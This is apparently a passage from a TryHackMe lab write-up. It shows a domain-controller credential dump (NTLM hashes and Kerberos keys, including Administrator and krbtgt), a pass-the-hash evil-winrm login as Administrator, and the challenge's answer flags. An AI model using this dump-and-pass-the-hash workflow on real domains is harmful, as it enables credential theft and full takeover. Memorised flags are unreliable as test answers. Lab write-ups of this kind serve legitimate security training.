[*] Starting service RemoteRegistry
[-] RemoteOperations failed: SMB SessionError: STATUS_PIPE_NOT_AVAILABLE(An instance of a named pipe cannot be found in the listening state.)
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:c2597747aa5e43022a3a3049a3c3b09d:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:7633f01273fc92450b429d6067d1ca32:::
vulnnet-rst.local\enterprise-core-vn:1104:aad3b435b51404eeaad3b435b51404ee:8752ed9e26e6823754dce673de76ddaf:::
vulnnet-rst.local\a-whitehat:1105:aad3b435b51404eeaad3b435b51404ee:1bd408897141aa076d62e9bfc1a5956b:::
vulnnet-rst.local\t-skid:1109:aad3b435b51404eeaad3b435b51404ee:49840e8a32937578f8c55fdca55ac60b:::
vulnnet-rst.local\j-goldenhand:1110:aad3b435b51404eeaad3b435b51404ee:1b1565ec2b57b756b912b5dc36bc272a:::
vulnnet-rst.local\j-leet:1111:aad3b435b51404eeaad3b435b51404ee:605e5542d42ea181adeca1471027e022:::
WIN-2BO8M1OE1M1$:1000:aad3b435b51404eeaad3b435b51404ee:70d01ee15ee1ff5e17b1689bf257825b:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:7f9adcf2cb65ebb5babde6ec63e0c8165a982195415d81376d1f4ae45072ab83
Administrator:aes128-cts-hmac-sha1-96:d9d0cc6b879ca5b7cfa7633ffc81b849
Administrator:des-cbc-md5:52d325cb2acd8fc1
krbtgt:aes256-cts-hmac-sha1-96:a27160e8a53b1b151fa34f45524a07eb9899ebdf0051b20d677f0c3b518885bd
krbtgt:aes128-cts-hmac-sha1-96:75c22aac8f2b729a3a5acacec729e353
krbtgt:des-cbc-md5:1357f2e9d3bc0bd3
vulnnet-rst.local\enterprise-core-vn:aes256-cts-hmac-sha1-96:9da9e2e1e8b5093fb17b9a4492653ceab4d57a451bd41de36b7f6e06e91e98f3
vulnnet-rst.local\enterprise-core-vn:aes128-cts-hmac-sha1-96:47ca3e5209bc0a75b5622d20c4c81d46
vulnnet-rst.local\enterprise-core-vn:des-cbc-md5:200e0102ce868016
vulnnet-rst.local\a-whitehat:aes256-cts-hmac-sha1-96:f0858a267acc0a7170e8ee9a57168a0e1439dc0faf6bc0858a57687a504e4e4c
vulnnet-rst.local\a-whitehat:aes128-cts-hmac-sha1-96:3fafd145cdf36acaf1c0e3ca1d1c5c8d
vulnnet-rst.local\a-whitehat:des-cbc-md5:028032c2a8043ddf
vulnnet-rst.local\t-skid:aes256-cts-hmac-sha1-96:a7d2006d21285baee8e46454649f3bd4a1790c7f4be7dd0ce72360dc6c962032
vulnnet-rst.local\t-skid:aes128-cts-hmac-sha1-96:8bdfe91cca8b16d1b3b3fb6c02565d16
vulnnet-rst.local\t-skid:des-cbc-md5:25c2739dcb646bfd
vulnnet-rst.local\j-goldenhand:aes256-cts-hmac-sha1-96:fc08aeb44404f23ff98ebc3aba97242155060928425ec583a7f128a218e4c5ad
vulnnet-rst.local\j-goldenhand:aes128-cts-hmac-sha1-96:7d218a77c73d2ea643779ac9b125230a
vulnnet-rst.local\j-goldenhand:des-cbc-md5:c4e65d49feb63180
vulnnet-rst.local\j-leet:aes256-cts-hmac-sha1-96:1327c55f2fa5e4855d990962d24986b63921bd8a10c02e862653a0ac44319c62
vulnnet-rst.local\j-leet:aes128-cts-hmac-sha1-96:f5d92fe6dc0f8e823f229fab824c1aa9
vulnnet-rst.local\j-leet:des-cbc-md5:0815580254a49854
WIN-2BO8M1OE1M1$:aes256-cts-hmac-sha1-96:f8b73352bb3a234efac83be9bd4c507511d6ba4a17ac9206fdf3aa8996755537
WIN-2BO8M1OE1M1$:aes128-cts-hmac-sha1-96:e54122b0bca35b8f3b3e382663b6494d
WIN-2BO8M1OE1M1$:des-cbc-md5:3bdf456be5f72cd6
[*] Cleaning up... 
[*] Stopping service RemoteRegistry
[-] SCMR SessionError: code: 0x41b - ERROR_DEPENDENT_SERVICES_RUNNING - A stop control has been sent to a service that other running services are dependent on.
[*] Cleaning up... 
[*] Stopping service RemoteRegistry

using hash admin

┌──(root㉿kali)-[/home/kali/VulnNet]
└─# evil-winrm -i 10.10.169.84 -u Administrator -H 'c2597747aa5e43022a3a3049a3c3b09d' -N

Evil-WinRM shell v3.4

Warning: Remote path completion is disabled

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\Administrator\Documents> cd \Desktop
Cannot find path 'C:\Desktop' because it does not exist.
At line:1 char:1
+ cd \Desktop
+ ~~~~~~~~~~~
    + CategoryInfo          : ObjectNotFound: (C:\Desktop:String) [Set-Location], ItemNotFoundException
    + FullyQualifiedErrorId : PathNotFound,Microsoft.PowerShell.Commands.SetLocationCommand

*Evil-WinRM* PS C:\Users\Administrator\Documents> 
*Evil-WinRM* PS C:\Users\Administrator\Documents> cd ..\Desktop
*Evil-WinRM* PS C:\Users\Administrator\Desktop> dir


    Directory: C:\Users\Administrator\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        3/13/2021   3:34 PM             39 system.txt


*Evil-WinRM* PS C:\Users\Administrator\Desktop> type system.txt
THM{16f45e3934293a57645f8d7bf71d8d4c}


```



	What is the user flag? (Desktop\user.txt)  

*THM{726b7c0baaac1455d05c827b5561f4ed}*

	What is the system flag? (Desktop\system.txt)

*THM{16f45e3934293a57645f8d7bf71d8d4c}*


[[VulnNet Internal]]